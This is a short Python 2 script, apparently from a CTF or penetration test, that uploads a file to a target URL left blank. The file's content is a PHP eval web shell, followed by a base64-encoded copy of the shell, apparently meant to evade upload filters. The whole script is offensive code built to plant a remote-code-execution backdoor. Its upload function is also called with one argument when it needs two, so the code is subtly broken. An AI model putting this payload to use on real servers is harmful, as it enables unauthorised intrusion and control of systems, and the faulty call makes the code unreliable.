#!/bin/env python
#-*- encoding: utf-8 -*-

import requests
import re
import string
import random
import sys

reload(sys)
sys.setdefaultencoding("utf-8")

req = requests.session()
url = ''


def upload(file_name, file_data):
    files = {
        "file": (file_name, file_data, 'application/octet-stream'),
    }
    res = req.post(url=url, files=files)
    if res.status_code == 200:
        return res.content
    else:
        return False


if __name__ == '__main__':
    shell1 = '<?php eval($_POST[999]);?>paaaPD9waHAgZXZhbCgkX1BPU1RbOTk5XSk7Pz5w'
    res = upload(shell1)
    if res:
        print res
